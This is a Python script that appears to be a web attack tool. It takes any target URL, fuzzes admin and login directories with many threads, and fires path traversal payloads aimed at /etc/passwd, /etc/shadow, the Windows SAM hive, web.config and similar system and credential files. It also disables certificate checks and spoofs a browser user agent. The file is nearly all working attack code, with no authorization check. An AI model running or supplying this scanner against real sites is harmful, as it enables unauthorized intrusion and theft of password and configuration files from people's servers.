import requests
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
import urllib.parse

# Disable warnings for insecure connections (useful for testing HTTPS with invalid certs)
requests.packages.urllib3.disable_warnings()

# Define the target URL
TARGET_URL = input("Give the application URL:")

# Wordlist for directory fuzzing
DIRECTORY_WORDLIST = [
    'admin', 'login', 'auth', 'authentication', 'user', 'account', 'dashboard',
    'secure', 'protected', 'private', 'cpanel', 'controlpanel', 'administrator',
    'manager', 'register', 'signup', 'signin', 'profile', 'settings', 'secure',
    'confidential', 'auth/login', 'auth/signup', 'auth/signin', 'auth/admin',
    'auth/account', 'auth/profile', 'auth/settings', 'auth/dashboard', 'admin/login',
    'admin/signup', 'admin/signin', 'admin/account', 'admin/profile', 'admin/settings',
    'admin/dashboard', 'account/login', 'account/signup', 'account/signin',
    'account/profile', 'account/settings', 'account/dashboard', 'user/login',
    'user/signup', 'user/signin', 'user/account', 'user/profile', 'user/settings',
    'user/dashboard', 'dashboard/login', 'dashboard/signup', 'dashboard/signin',
    'dashboard/account', 'dashboard/profile', 'dashboard/settings'
]

# Path traversal payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../../../../../../../../etc/passwd", "../../../../../../../../etc/shadow",
    "../../../../../../../../etc/hosts", "../../../../../../../../etc/group",
    "../../../../../../../../etc/issue", "../../../../../../../../etc/crontab",
    "../../../../../../../../etc/ssh/sshd_config", "../../../../../../../../etc/mysql/my.cnf",
    "../../../../../../../../var/log/auth.log", "../../../../../../../../var/log/apache2/access.log",
    "../../../../../../../../var/www/html/admin", "../../../../../../../../windows/win.ini",
    "../../../../../../../../windows/system32/config/SAM", "../../../../../../../../windows/system32/drivers/etc/hosts",
    "../../../../../../../../windows/system32/license.rtf", "../../../../../../../../windows/system32/config/system",
    "../../../../../../../../windows/system32/config/software", "../../../../../../../../inetpub/wwwroot/index.html",
    "../../../../../../../../inetpub/wwwroot/login.aspx", "../../../../../../../../inetpub/wwwroot/web.config",
    "../../../../../../../../inetpub/wwwroot/admin/admin.aspx", "../../../../../../../../inetpub/wwwroot/global.asax"
]

# User-Agent for requests
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
}

# Function to make HTTP requests
def make_request(url):
    try:
        response = requests.get(url, headers=HEADERS, timeout=10, verify=False)
        return response
    except requests.exceptions.RequestException as e:
        print(f"Error making request to {url}: {e}")
        return None

# Function to fuzz directories
def fuzz_directories(base_url):
    found_urls = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_url = {executor.submit(make_request, f"{base_url}/{directory}"): directory for directory in DIRECTORY_WORDLIST}
        for future in future_to_url:
            response = future.result()
            if response and response.status_code in [200, 301, 302]:
                found_urls.append((response.url, response.status_code))
    return found_urls

# Function to attempt path traversal
def attempt_path_traversal(base_url):
    found_paths = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_path = {executor.submit(make_request, f"{base_url}/{payload}"): payload for payload in PATH_TRAVERSAL_PAYLOADS}
        for future in future_to_path:
            response = future.result()
            if response and response.status_code in [200, 301, 302]:
                found_paths.append((response.url, response.status_code))
    return found_paths

# Function to detect login forms in HTML
def detect_login_form(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    forms = soup.find_all('form')
    for form in forms:
        if any(field in str(form) for field in ['password', 'login', 'signin', 'auth']):
            return True
    return False

# Main function
def main():
    print(f"Starting fuzzing on {TARGET_URL}\n")

    # Fuzz directories
    print("Fuzzing directories...")
    fuzzed_directories = fuzz_directories(TARGET_URL)
    print(f"Found potential authenticated pages:\n")
    for url, status in fuzzed_directories:
        print(f"[{status}] {url}")

    # Attempt path traversal
    print("\nAttempting path traversal...")
    traversed_paths = attempt_path_traversal(TARGET_URL)
    print(f"Found potential path traversal paths:\n")
    for url, status in traversed_paths:
        print(f"[{status}] {url}")

    # Detect login forms
    print("\nChecking for login forms in discovered pages...")
    authenticated_pages = []
    for url, status in fuzzed_directories:
        response = make_request(url)
        if response and detect_login_form(response.text):
            authenticated_pages.append((url, status))

    if authenticated_pages:
        print("\nDetected login forms on the following pages:\n")
        for url, status in authenticated_pages:
            print(f"[{status}] {url}")
    else:
        print("\nNo authenticated pages with login forms detected.")

if __name__ == "__main__":
    main()
